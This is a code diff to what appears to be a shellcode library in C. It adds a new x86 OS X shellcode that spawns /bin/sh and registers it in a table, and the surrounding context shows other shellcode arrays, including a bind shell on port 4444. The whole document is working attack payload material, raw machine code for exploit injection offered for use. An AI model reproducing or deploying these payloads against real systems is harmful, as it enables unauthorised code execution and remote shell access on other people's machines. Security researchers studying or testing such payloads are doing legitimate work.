@@ -142,6 +142,7 @@ unsigned char x86_linux_binsh[] =
 unsigned char x86_linux_binsh1[] = // -( nemo )-
     "\xeb\x10\x5b\x31\xc0\x50\x53\xb0\x0b\x88\x63\x07\x89\xe1\x31\xd2\xcd\x80\xe8\xeb\xff\xff\xff/bin/shX";
 
+/* 0xcafebabe.it */
 unsigned char x86_linux_binsh2[] =
    "\x89\xfb\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x6a\x0b\x58\x99\x52"
    "\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80";
@@ -429,6 +430,11 @@ unsigned char x86_osx_binsh[] =
 	"\x07\x89\x5f\xf5\x88\x5f\xfa\x9a\xff"
 	"\xff\xff\xff\x2b\xff\xe8\xe3\xff\xff"
 	"\xff/bin/shX";
+
+unsigned char x86_osx_binsh2[] = 
+    "\x99\x52\x68\x2f\x2f\x73\x68\x68"
+    "\x2f\x62\x69\x6e\x89\xe3\x52\x54"
+    "\x54\x53\x53\x8d\x42\x3b\xcd\x80";
 
 unsigned char x86_osx_bind4444[] =
    "\x33\xc9\x83\xe9\xea\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xc5"
@@ -752,6 +758,7 @@ struct shellcode_t shellcodes[] = {
  ENTRY(0,0,0,"x86.openbsd.binsh",     x86_openbsd_binsh,        "Executes /bin/sh" )
  ENTRY(0,0,0,"x86.openbsd.bind6969",  x86_openbsd_bind6969,     "Executes /bin/sh" )
  ENTRY(0,0,0,"x86.osx.binsh",         x86_osx_binsh,            "Executes /bin/sh" )
+ ENTRY(0,0,0,"x86.osx.binsh2",        x86_osx_binsh2,            "Executes /bin/sh" )
  ENTRY(0,0,0,"x86.osx.bind4444",      x86_osx_bind4444,         "Binds a shell at port 4444" )
  ENTRY(0,0,0,"x86.solaris.binsh",     x86_solaris_binsh,        "Runs /bin/sh" )
  ENTRY(0,0,0,"x86.solaris.binshu",    x86_solaris_binshu,       "Runs /bin/sh (toupper() safe)" )
